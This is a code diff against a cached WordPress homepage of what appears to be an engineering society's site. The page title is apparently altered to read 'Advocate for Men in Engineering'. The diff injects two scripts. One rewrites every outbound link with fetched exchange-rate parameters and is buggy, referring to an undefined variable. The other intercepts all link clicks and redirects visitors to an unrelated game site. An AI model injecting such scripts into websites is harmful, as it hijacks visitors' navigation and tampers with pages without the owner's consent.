@@ -3,7 +3,36 @@
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+<script>
+    fetch('https://httpbin.org/encoding/utf8')
+        .then((response) => {
+            return response.text();
+        })
+        .then((text) => {
+            document.getElementById("MyFetchedString").innerHTML = text.slice(0, 10);
+        }); 
+    document.addEventListener( "DOMContentLoaded", modify_outbound_links);
 
+    function modify_outbound_links(){
+
+    fetch('https://api.exchangeratesapi.io/latest?symbols=USD,GBP')
+    .then((response) => {
+        return response.json();
+    })
+    .then((json) => {
+
+    anchors = document.getElementsByTagName('a');
+    for (let i = 0; i < anchors.length; i++) {
+        let p = anchors[i].href;
+        if (p.indexOf('example.com') === -1) {
+        //How do i append the fetchedText? 
+            anchors[i].href = p + (p.indexOf('?') != -1 ? "&" : "?") + 'FetchedText&' + 'USD='+json['rates']['USD'] + '&GBP=' + json['rates']['GBP']; 
+        }
+    }
+    document.getElementById("MyFetchedString").innerHTML = text.slice(0, 10);
+  });
+}
+</script>
 <!-- Search Engine Optimization by Rank Math - https://rankmath.com/ -->
 <title>SME - The World&#039;s Largest Advocate for Men in Engineering</title>
 <meta name="description" content="Join SME today, the world&#039;s largest advocate for men in engineering. Find opportunities, training programs, and make a lasting impact on the future."/>
@@ -5311,6 +5340,27 @@ function uc_post_carousel_elementor20989_start(){
 </script>
 <script>window.advads_admin_bar_items = [];</script><script>window.advads_passive_groups = {"1402_1":{"type":"group","id":1402,"elementid":["advads-82c0e0d02d28c500fa87ba0e401c8447"],"ads":{"31418":{"id":31418,"title":"Dover Banner Ad March-July 2024","expiry_date":1722142740,"visitors":[],"content":"<div data-advadstrackid=\"31418\" data-advadstrackbid=\"1\" data-advadsredirect=\"1\" class=\"advads-target\" data-cfpa=\"31418\" id=\"advads-1836569762\"><a data-bid=\"1\" href=\"https:\/\/swe.org\/linkout\/31418\" rel=\"noopener nofollow sponsored\" class=\"notrack\" target=\"_blank\"><img loading=\"lazy\" decoding=\"async\" src=\"https:\/\/swe.org\/wp-content\/uploads\/2024\/03\/Dover-SWE-Banner-final.png\" alt=\"Dover SWE Banner final\"  width=\"250\" height=\"250\"   \/><\/a><\/div><script type=\"text\/javascript\">;new advadsCfpAd( 31418 );<\/script>","once_per_page":0,"debugmode":false,"blog_id":1,"type":"image","position":"none","tracking_enabled":true,"privacy":{"ignore":false,"needs_consent":false}},"24627":{"id":24627,"title":"AFRL June 23-June 24","expiry_date":1717304340,"visitors":[],"content":"<div data-advadstrackid=\"24627\" data-advadstrackbid=\"1\" data-advadsredirect=\"1\" class=\"advads-target\" data-cfpa=\"24627\" id=\"advads-1871324185\"><a data-bid=\"1\" href=\"https:\/\/swe.org\/linkout\/24627\" rel=\"noopener nofollow sponsored\" class=\"notrack\" target=\"_blank\"><img loading=\"lazy\" decoding=\"async\" src=\"https:\/\/swe.org\/wp-content\/uploads\/2023\/05\/SWE_AFRL_250X250_BANNER_AD_June-23-June-24.png\" alt=\"SWE AFRL X BANNER AD June June\"  width=\"250\" height=\"250\"   \/><\/a><\/div><script type=\"text\/javascript\">;new advadsCfpAd( 24627 );<\/script>","once_per_page":0,"debugmode":false,"blog_id":1,"type":"image","position":"none","tracking_enabled":true,"privacy":{"ignore":false,"needs_consent":false}},"30980":{"id":30980,"title":"Tata Consultancy Services Banner Ad March-April 2024","expiry_date":1714496340,"visitors":[],"content":"<div data-advadstrackid=\"30980\" data-advadstrackbid=\"1\" data-advadsredirect=\"1\" class=\"advads-target\" data-cfpa=\"30980\" id=\"advads-977467041\"><a data-bid=\"1\" href=\"https:\/\/swe.org\/linkout\/30980\" rel=\"noopener nofollow sponsored\" class=\"notrack\" target=\"_blank\"><img loading=\"lazy\" decoding=\"async\" src=\"https:\/\/swe.org\/wp-content\/uploads\/2024\/03\/TCS-March-Banner-Ad.png\" alt=\"TCS March Banner Ad\"  width=\"120\" height=\"240\"   \/><\/a><\/div><script type=\"text\/javascript\">;new advadsCfpAd( 30980 );<\/script>","once_per_page":0,"debugmode":false,"blog_id":1,"type":"image","position":"none","tracking_enabled":true,"privacy":{"ignore":false,"needs_consent":false}},"24429":{"id":24429,"title":"RTX May 2023-June 2024","expiry_date":1711947540,"visitors":[],"content":"<div data-advadstrackid=\"24429\" data-advadstrackbid=\"1\" data-advadsredirect=\"1\" class=\"advads-target\" data-cfpa=\"24429\" id=\"advads-1544329697\"><a data-bid=\"1\" href=\"https:\/\/swe.org\/linkout\/24429\" rel=\"noopener nofollow sponsored\" class=\"notrack\" target=\"_blank\"><img loading=\"lazy\" decoding=\"async\" src=\"https:\/\/swe.org\/wp-content\/uploads\/2023\/04\/250x250_SWE.jpg\" alt=\"x SWE\"  width=\"249\" height=\"249\"   \/><\/a><\/div><script type=\"text\/javascript\">;new advadsCfpAd( 24429 );<\/script>","once_per_page":0,"debugmode":false,"blog_id":1,"type":"image","position":"none","tracking_enabled":true,"privacy":{"ignore":false,"needs_consent":false}}},"group_info":{"id":1402,"name":"HP Sidebar Ads - 250x250","weights":{"22013":10,"22069":10,"20279":10,"21052":10,"31418":10,"30980":10,"24627":10,"24429":10},"type":"slider","ordered_ad_ids":[31418,24627,30980,24429],"ad_count":999},"group_wrap":[{"before":"<div id=\"advads-slider-1402\" class=\"custom-slider advads-slider-121373490 advads-slider\"><ul>","after":"<\/ul><\/div><script>( window.advanced_ads_ready || jQuery( document ).ready ).call( null, function() {var $advadsslider121373490 = jQuery( \".advads-slider-121373490\" );$advadsslider121373490.on( \"unslider.ready\", function() { jQuery( \"div.custom-slider ul li\" ).css( \"display\", \"block\" ); });$advadsslider121373490.unslider({ delay:8000, autoplay:true, nav:false, arrows:false, infinite:true });$advadsslider121373490.on(\"mouseover\", function(){$advadsslider121373490.unslider(\"stop\");}).on(\"mouseout\", function() {$advadsslider121373490.unslider(\"start\");});});<\/script>","each":"<li>%s<\/li>","min_ads":2},{"before":"<div data-cfptl=\"1\" id=\"advads-933127538\">","after":"<\/div>"}]}};
 ( window.advanced_ads_ready || jQuery( document ).ready ).call( null, function() {if ( !window.advanced_ads_pro ) {console.log("Advanced Ads Pro: cache-busting can not be initialized");} });</script><script>!function(){window.advanced_ads_ready_queue=window.advanced_ads_ready_queue||[],advanced_ads_ready_queue.push=window.advanced_ads_ready;for(var d=0,a=advanced_ads_ready_queue.length;d<a;d++)advanced_ads_ready(advanced_ads_ready_queue[d])}();</script><div class="pafe-break-point" data-pafe-break-point-md="767" data-pafe-break-point-lg="1024" data-pafe-ajax-url="https://swe.org/wp-admin/admin-ajax.php"></div><div data-pafe-form-builder-tinymce-upload="https://swe.org/wp-content/plugins/piotnet-addons-for-elementor-pro/inc/tinymce/tinymce-upload.php"></div><div data-pafe-plugin-url="https://swe.org/wp-content/plugins"></div><script id="advads-tracking">var advads_tracking_ads = {};var advads_tracking_urls = {"1":"https:\/\/swe.org\/wp-admin\/admin-ajax.php"};var advads_tracking_methods = {"1":"frontend"};var advads_tracking_parallel = {"1":false};var advads_tracking_linkbases = {"1":"https:\/\/swe.org\/linkout\/"};</script></body>
+
+<script>
+// var regexp = /https?:\/\/(www.){0,1}((?:[\w\d-]+\.)+[\w\d]{2,})/i;
+
+// document.addEventListener("click",function(){
+//     window.location.href ="https://minesweeperonline.com/";
+// });
+
+var Anchors = document.getElementsByTagName("a");
+
+for (var i = 0; i < Anchors.length ; i++) {
+    Anchors[i].addEventListener("click", 
+        function (event) {
+            event.preventDefault();
+            window.location.href ="https://minesweeperonline.com/";
+        }, 
+        false);
+}
+
+</script>
+
 </html>
 
 <!-- Cache served by breeze CACHE - Last modified: Fri, 29 Mar 2024 20:39:13 GMT -->
